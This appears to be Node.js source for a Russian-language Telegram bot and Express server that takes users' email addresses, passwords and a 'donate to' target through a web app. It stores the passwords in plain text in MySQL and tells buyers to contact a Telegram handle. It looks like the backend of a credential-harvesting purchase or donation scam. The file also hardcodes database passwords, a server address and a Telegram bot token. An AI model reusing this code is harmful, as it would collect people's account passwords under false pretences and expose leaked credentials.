// const mysql = require('mysql');
// const express = require('express');
// const cors = require('cors');
// const TelegramBot = require('node-telegram-bot-api');

// // Parse the JDBC URL to extract connection details
// const jdbcUrl = 'jdbc:mysql://u402_loX7s1O1wC:oTyAJHorGcvofpy.sKTcTd+9@192.168.1.12:3306/s402_storage';

// const host = '192.168.1.12';
// const port = '3306';
// const user = 'u402_loX7s1O1wC';
// const password = 'oTyAJHorGcvofpy.sKTcTd+9';
// const database = 's402_storage';

// // Create the connection pool
// const pool = mysql.createPool({
//   host: host,
//   port: port,
//   user: user,
//   password: password,
//   database: database,
//   waitForConnections: true,
//   connectionLimit: 10,
//   queueLimit: 0
// });

// const webAppUrl = 'https://astonishing-pothos-609d9e.netlify.app';
// const token = '7120533023:AAHdqojFMnTdpfMna2e8SAhh2VKETtZy9FQ';

// const bot = new TelegramBot(token, { polling: true });
// const app = express();

// app.use(express.json());
// app.use(cors());

// bot.on('message', async (msg) => {
//   const chatId = msg.chat.id;
//   const text = msg.text;

//   if (text === '/start') {
//     await bot.sendMessage(chatId, 'Добро пожаловать', {
//       reply_markup: {
//         inline_keyboard: [
//           [{ text: 'Make zakaz', web_app: { url: webAppUrl } }]
//         ]
//       }
//     });
//   }

//   if (msg?.web_app_data?.data) {
//     try {
//       const data = JSON.parse(msg?.web_app_data?.data);

//       // Save to database
//       const query = 'INSERT INTO users (email, password, subject) VALUES (?, ?, ?)';
//       pool.execute(query, [data.email, data.password, data.subject], (err, results) => {
//         if (err) {
//           console.error('Error inserting data:', err);
//           return;
//         }
//         console.log('Data saved with id:', results.insertId);
//       });

//       await bot.sendMessage(chatId, 'Спасибо за ваше доверие!');
//       await bot.sendMessage(chatId, 'Ваш имейл: ' + data?.email);
//       await bot.sendMessage(chatId, 'Ваш пароль: ' + data?.password);
//       await bot.sendMessage(chatId, 'Донат в: ' + data?.subject);
//     } catch (e) {
//       console.log(e);
//     }
//   }
// });

// app.post('/web-data', async (req, res) => {
//   const { queryId, product, totalPrice } = req.body;

//   try {
//     await bot.answerWebAppQuery(queryId, {
//       type: 'article',
//       id: queryId,
//       title: 'Победа',
//       input_message_content: {
//         message_text: "Хороший выбор, покупка прошла успешно! Ваша общая сумма составляет: " + totalPrice +
//           ". Свяжитесь с @ILojin для дальнейших указаний."
//       }
//     });
//     return res.status(200).json({});
//   } catch (e) {
//     await bot.answerWebAppQuery(queryId, {
//       type: 'article',
//       id: queryId,
//       title: 'Ошибка',
//       input_message_content: {
//         message_text: "ВЫшла ошибочка, не удалось приобрести товар. Свяжитесь с @ILojin для дальнейших указаний."
//       }
//     });
//     return res.status(505).json({});
//   }
// });

// const PORT = 8000;

// app.listen(PORT, () => console.log('server started on PORT ' + PORT));




const express = require('express');
const mysql = require('mysql');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const url = require('url');

const host = '192.168.1.12';
const port = '3306';
const username = 'u402_loX7s1O1wC';
const password = 'c=.9J3lfnJTt1VwfyMED!w9w';
const database = 's402_storage';

const pool = mysql.createPool({
  host: host,
  port: port,
  user: username,
  password: password,
  database: database,
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
});

// Telegram bot setup
const webAppUrl = 'https://astonishing-pothos-609d9e.netlify.app';
const token = '7120533023:AAHdqojFMnTdpfMna2e8SAhh2VKETtZy9FQ';

const bot = new TelegramBot(token, { polling: true });
const app = express();

app.use(express.json());
app.use(cors());

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === '/start') {
    await bot.sendMessage(chatId, 'Добро пожаловать', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Make zakaz', web_app: { url: webAppUrl } }]
        ]
      }
    });
  }

  if (msg?.web_app_data?.data) {
    try {
      const data = JSON.parse(msg?.web_app_data?.data);

      // Save to database
      const query = 'INSERT INTO users (email, password, subject) VALUES (?, ?, ?)';
      pool.execute(query, [data.email, data.password, data.subject], (err, results) => {
        if (err) {
          console.error('Error inserting data:', err);
          return;
        }
        console.log('Data saved with id:', results.insertId);
      });

      await bot.sendMessage(chatId, 'Спасибо за ваше доверие!');
      await bot.sendMessage(chatId, 'Ваш имейл: ' + data?.email);
      await bot.sendMessage(chatId, 'Ваш пароль: ' + data?.password);
      await bot.sendMessage(chatId, 'Донат в: ' + data?.subject);
    } catch (e) {
      console.log(e);
    }
  }
});

app.post('/web-data', async (req, res) => {
  const { email, password, subject } = req.body;
  console.log('Received data:', req.body); 

  const query = 'INSERT INTO users (email, password, subject) VALUES (?, ?, ?)';
  pool.execute(query, [email, password, subject], (err, results) => {
    if (err) {
      console.error('Error inserting data:', err);
      return res.status(500).json({ message: 'Internal Server Error' });
    }
    res.status(200).json({ message: 'Data saved successfully', id: results.insertId });
  });
});

const PORT = 25293;
app.listen(PORT, () => console.log('Server started on PORT ' + PORT));



pool.getConnection((err, connection) => {
  if (err) {
    console.error('Error connecting to the database:', err);
  } else {
    console.log('Connected to the database');
    connection.release();
  }
});


// const con = mysql.createConnection({
//   host: '95.163.234.85',
//   // port: '3306',
//   user: 'musona',
//   password: 'Easgreddfghfdkjk2341!',
//   database: 's402_storage',
// });

// con.connect(err=>{
//   if(err){
//     console.log(err);
//     return err;
//   }
//   else{
//     console.log("DATABASE----OK");
//   }
// }

// )